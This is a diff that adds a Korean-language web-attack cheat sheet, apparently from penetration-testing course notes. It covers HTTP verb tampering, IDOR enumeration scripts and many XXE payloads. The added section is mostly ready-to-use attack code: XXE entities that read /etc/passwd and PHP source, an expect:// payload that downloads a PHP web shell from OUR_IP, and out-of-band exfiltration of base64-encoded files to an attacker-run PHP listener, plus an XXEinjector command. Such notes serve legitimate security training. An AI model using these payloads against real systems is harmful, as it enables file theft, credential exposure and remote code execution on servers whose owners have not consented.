@@ -845,5 +845,207 @@ Invoke-DOSfuscation> encoding
 Invoke-DOSfuscation\Encoding> 1
 ```
 
+<br/><br/>
+# Web Application Attacks
+
+## HTTP Verb Tampering
+| Verb      | 설명                                            |
+| --------- | --------------------------------------------- |
+| `HEAD`    | GET 요청과 동일하지만 응답에는 응답 본문 없이 `headers`만 포함됩니다. |
+| `PUT`     | 지정된 위치에 요청 페이로드를 씁니다.                         |
+| `DELETE`  | 지정된 위치의 리소스를 삭제합니다.                           |
+| `OPTIONS` | 웹 서버에서 허용하는 다양한 옵션(허용되는 HTTP 동사 등)을 보여줍니다.    |
+| `PATCH`   | 지정된 위치의 리소스에 부분 수정을 적용합니다.                    |
+
+```curl -i -X OPTIONS http://SERVER_IP:PORT/```
+
+<br/><br/>
+## Insecure Direct Object References (IDOR)
+
+### Insecure Parameters Mass Enumeration
+```python
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+### Encoded References Mass Enumeration
+```
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+<br/><br/>
+## XML External Entity(XXE) Injection
+
+### XML
+| Key           | 정의                                                       | 예                                        |
+| ------------- | -------------------------------------------------------- | ---------------------------------------- |
+| `Tag`         | 일반적으로 (`<` / `>`) 문자로 묶인 XML 문서의 키입니다 .                  | `<date>`                                 |
+| `Entity`      | 일반적으로 (`&` / `;`) 문자로 묶인 XML 변수입니다 .                     | `&lt;`                                   |
+| `Element`     | 루트 요소나 그 자식 요소와 그 값은 시작 태그와 끝 태그 사이에 저장됩니다.              | `<date>01-01-2022</date>`                |
+| `Attribute`   | XML 파서에서 사용될 수 있는 태그에 저장된 모든 요소에 대한 선택적 사양입니다.           | `version="1.0"`/`encoding="UTF-8"`       |
+| `Declaration` | 일반적으로 XML 문서의 첫 번째 줄이며, 구문 분석할 때 사용할 XML 버전과 인코딩을 정의합니다. | `<?xml version="1.0" encoding="UTF-8"?>` |
+
+### XML Document Type Definition(DTD)
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
+```
+
+### XML Entities
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "http://localhost/company.txt">
+  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
+]>
+```
+
+### Local File Disclosure
+- JSON 데이터를 XML로 변환 : [online tool](https://www.convertjson.com/json-to-xml.htm)
+
+#### Reading Sensitive Files
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+```
+
+#### Reading Source Code
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+### Remote Code Execution with XXE
+```
+$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+$ sudo python3 -m http.server 80
+```
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
+> 참고 : Space, `|`, `>`, 및 `{` 사용을 피해야 함
+
+## Advanced File Disclosure
+
+### Exfiltration with CDATA
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+- 변형 공격
+```
+$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+$ python3 -m http.server 8000
+```
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+### Error Based XXE
+- DTD 파일
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+## Blind Data Exfiltration
+
+### Out-of-band(OOB) Data Exfiltration
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+```
+$ vi index.php # here we write the above PHP code
+$ php -S 0.0.0.0:8000
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+### Automated OOB Exfiltration
+```git clone https://github.com/enjoiz/XXEinjector.git```
+```
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+```ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter```<br/>
+```cat Logs/10.129.201.94/etc/passwd.log```
+
+
+
+
+
+
+
 
 
